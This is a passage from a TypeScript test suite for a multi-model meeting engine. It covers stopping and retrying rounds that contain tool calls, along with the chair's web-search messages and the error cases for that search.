        await ask(w, w.gpt);
        await until(() => w.tools.calls.length === 1);
        await w.engine.stop(w.meeting.id);
        await w.engine.waitIdle(w.meeting.id);
        const msg = await lastMessage(w);
        expect(msg.status).toBe("stopped");
        expect(msg.toolCalls[0]?.status).toBe("failed");
        expect(w.llm.callsFor(w.gpt.model)).toHaveLength(1);
      });

      it("Retry starts over, without the old tool calls", async () => {
        const w = await world();
        await enable(w.gpt);
        w.llm.on(
          w.gpt.model,
          { chunks: [], toolCalls: [toolCall("web_search", { query: "first" })] },
          { error: new LlmError("gateway_error", "boom"), chunks: [] },
          { chunks: ["Second try."] },
        );
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        const failed = await lastMessage(w);
        expect(failed.status).toBe("error");
        expect(failed.toolCalls).toHaveLength(1);
        await w.engine.retry(w.meeting.id, failed.id);
        await w.engine.waitIdle(w.meeting.id);
        const retried = await lastMessage(w);
        expect(retried.status).toBe("done");
        expect(retried.toolCalls).toEqual([]);
      });
    });

    describe("the chair's search", () => {
      it("posts one message every seat reads, with no model involved", async () => {
        const w = await world();
        const message = await w.engine.search(w.meeting.id, "gold price");
        expect(w.llm.calls).toEqual([]);
        expect(message).toMatchObject({ authorKind: "sources", status: "done" });
        expect(message.visibleSeq).not.toBeNull();
        expect(message.content).toContain('Results for "gold price"');
        expect(message.content).toContain("[Gold today](https://news.example/gold)");
        expect(message.toolCalls[0]?.urls).toEqual(SEARCH_URLS);

        await w.engine.send(w.meeting.id, {
          text: "What do you make of that?",
          mode: "blind",
          targets: "everyone",
          replyTo: null,
        });
        await w.engine.waitIdle(w.meeting.id);
        for (const seat of [w.claude, w.gpt, w.ds]) {
          const seen = userText(w.llm.callsFor(seat.model)[0] as ChatTurn);
          expect(seen).toContain("[Web search results the Chair posted]");
          expect(seen).toContain("[Gold today](https://news.example/gold)");
        }
      });

      it("can run during a round, and seats already answering don't see it", async () => {
        const w = await world();
        w.llm.on(w.gpt.model, { chunks: ["Thinking"], hangAfterChunks: true });
        await ask(w, w.gpt);
        await until(async () => (await lastMessage(w))?.status === "streaming");
        await w.engine.search(w.meeting.id, "gold");
        await w.engine.stop(w.meeting.id);
        await w.engine.waitIdle(w.meeting.id);
        expect(userText(w.llm.callsFor(w.gpt.model)[0] as ChatTurn)).not.toContain(
          "Web search results",
        );
      });

      it("says so when nothing was found, and posts nothing", async () => {
        const w = await world();
        w.tools.searchResult = {
          text: 'No results for "zzz". Try different words.',
          isError: false,
          meta: { results: [] },
        };
        await expect(w.engine.search(w.meeting.id, "zzz")).rejects.toMatchObject({
          status: 400,
          message: expect.stringContaining("No results"),
        });
        const state = await store.getState(w.meeting.id);
        expect(state?.messages).toEqual([]);
      });

      it("reports mcpgw being unreachable, or not set up", async () => {
        const w = await world();
        w.tools.callThrows = true;
        await expect(w.engine.search(w.meeting.id, "q")).rejects.toMatchObject({ status: 502 });
        const none = new Engine({ store, llm: w.llm, hub: w.hub, viewTokenBudget: 120_000 });
        await expect(none.search(w.meeting.id, "q")).rejects.toMatchObject({ status: 503 });
      });

      it("can't be replied to", async () => {
        const w = await world();
        const message = await w.engine.search(w.meeting.id, "gold");
        await expect(
          w.engine.send(w.meeting.id, {
            text: "",
            mode: "blind",
            targets: [w.gpt.id],
            replyTo: message.id,
          }),
        ).rejects.toBeInstanceOf(EngineError);
      });
    });
  });
});
